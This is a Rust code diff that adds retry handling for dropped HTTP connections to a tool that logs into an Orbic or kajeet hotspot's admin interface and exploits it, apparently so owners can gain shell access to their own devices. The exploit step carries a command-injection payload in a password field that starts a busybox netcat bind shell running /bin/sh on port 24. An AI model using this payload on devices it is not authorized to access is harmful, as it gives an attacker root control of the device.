@@ -16,6 +16,40 @@ use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};
 // Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
 const TELNET_PORT: u16 = 24;
 
+/// Max retries for HTTP requests when the Orbic closes the connection early (e.g. RC400L).
+const HTTP_CONNECTION_CLOSED_RETRIES: u32 = 3;
+
+fn is_connection_closed_error(err: &anyhow::Error) -> bool {
+    err.chain()
+        .any(|e| e.to_string().contains("connection closed"))
+}
+
+/// Retries the future up to HTTP_CONNECTION_CLOSED_RETRIES times when the error
+/// is "connection closed" (e.g. Orbic RC400L closing the connection early).
+async fn retry_http<F, Fut, T>(mut f: F) -> Result<T>
+where
+    F: FnMut() -> Fut,
+    Fut: std::future::Future<Output = Result<T>>,
+{
+    let mut last_err = None;
+    for attempt in 0..=HTTP_CONNECTION_CLOSED_RETRIES {
+        match f().await {
+            Ok(t) => return Ok(t),
+            Err(e) => {
+                last_err = Some(e);
+                if attempt < HTTP_CONNECTION_CLOSED_RETRIES
+                    && is_connection_closed_error(last_err.as_ref().unwrap())
+                {
+                    sleep(Duration::from_millis(500 * (attempt + 1) as u64)).await;
+                    continue;
+                }
+                return Err(last_err.unwrap());
+            }
+        }
+    }
+    unreachable!()
+}
+
 #[derive(Deserialize, Debug)]
 struct ExploitResponse {
     retcode: u32,
@@ -28,26 +62,33 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
     let client: Client = Client::builder().pool_max_idle_per_host(0).build()?;
 
     // Step 1: Get login info (priKey and session cookie)
-    let login_info_response = client
-        .get(format!("http://{}/goform/GetLoginInfo", admin_ip))
-        .send()
-        .await
-        .context("Failed to get login info")?;
+    // Retry on connection closed; some firmware (e.g. RC400L) closes the connection early.
+    let (session_cookie, login_info) = retry_http(|| async {
+        let login_info_response = client
+            .get(format!("http://{}/goform/GetLoginInfo", admin_ip))
+            .send()
+            .await
+            .context("Failed to get login info")?;
 
-    let session_cookie = login_info_response
-        .headers()
-        .get("set-cookie")
-        .and_then(|cookie| cookie.to_str().ok())
-        .context("No session cookie received")?
-        .split(';')
-        .next()
-        .context("Invalid cookie format")?
-        .to_string();
+        let session_cookie = login_info_response
+            .headers()
+            .get("set-cookie")
+            .and_then(|cookie| cookie.to_str().ok())
+            .context("No session cookie received")?
+            .split(';')
+            .next()
+            .context("Invalid cookie format")?
+            .to_string();
 
-    let login_info: LoginInfo = login_info_response
-        .json()
-        .await
-        .context("Failed to parse login info")?;
+        let login_info: LoginInfo = login_info_response
+            .json()
+            .await
+            .context("Failed to parse login info")?;
+
+        Ok((session_cookie, login_info))
+    })
+    .await
+    .context("Failed to get login info")?;
 
     if login_info.retcode != 0 {
         bail!("GetLoginInfo failed with retcode: {}", login_info.retcode);
@@ -76,51 +117,60 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
         password: encoded_password,
     };
 
-    // Step 3: Perform login
-    let login_response = client
-        .post(format!("http://{}/goform/login", admin_ip))
-        .header("Content-Type", "application/json")
-        .header("Cookie", &session_cookie)
-        .json(&login_request)
-        .send()
-        .await
-        .context("Failed to send login request")?;
+    // Step 3: Perform login (retry on connection closed)
+    let authenticated_cookie = retry_http(|| async {
+        let login_response = client
+            .post(format!("http://{}/goform/login", admin_ip))
+            .header("Content-Type", "application/json")
+            .header("Cookie", &session_cookie)
+            .json(&login_request)
+            .send()
+            .await
+            .context("Failed to send login request")?;
 
-    // Extract authenticated session cookie from login response
-    let authenticated_cookie = login_response
-        .headers()
-        .get("set-cookie")
-        .and_then(|cookie| cookie.to_str().ok())
-        .map(|cookie| cookie.split(';').next().unwrap_or(cookie).to_string())
-        .unwrap_or(session_cookie);
+        let authenticated_cookie = login_response
+            .headers()
+            .get("set-cookie")
+            .and_then(|cookie| cookie.to_str().ok())
+            .map(|cookie| cookie.split(';').next().unwrap_or(cookie).to_string())
+            .unwrap_or_else(|| session_cookie.clone());
 
-    let login_result: LoginResponse = login_response
-        .json()
-        .await
-        .context("Failed to parse login response")?;
+        let login_result: LoginResponse = login_response
+            .json()
+            .await
+            .context("Failed to parse login response")?;
 
-    if login_result.retcode != 0 {
-        match login_result.retcode {
-            201 => bail!("Login failed: incorrect password"),
-            code => bail!("Login failed with retcode: {}", code),
+        if login_result.retcode != 0 {
+            match login_result.retcode {
+                201 => bail!("Login failed: incorrect password"),
+                code => bail!("Login failed with retcode: {}", code),
+            }
         }
-    }
+        Ok(authenticated_cookie)
+    })
+    .await
+    .context("Failed to parse login response")?;
 
-    // Step 4: Exploit using authenticated session
-    let response: ExploitResponse = client
-        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
-        .header("Content-Type", "application/json")
-        .header("Cookie", authenticated_cookie)
-        // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
-        .body(format!(
-            r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
-        ))
-        .send()
-        .await
-        .context("failed to start telnet")?
-        .json()
-        .await
-        .context("failed to start telnet")?;
+    // Step 4: Exploit using authenticated session (retry on connection closed)
+    let response: ExploitResponse = retry_http(|| async {
+        let res = client
+            .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
+            .header("Content-Type", "application/json")
+            .header("Cookie", &authenticated_cookie)
+            // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
+            .body(format!(
+                r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
+            ))
+            .send()
+            .await
+            .context("failed to start telnet")?
+            .json()
+            .await
+            .context("failed to start telnet")?;
+        Ok(res)
+    })
+    .await
+    .context("failed to start telnet")?;
 
     if response.retcode != 0 {
         bail!("unexpected response while starting telnet: {:?}", response);
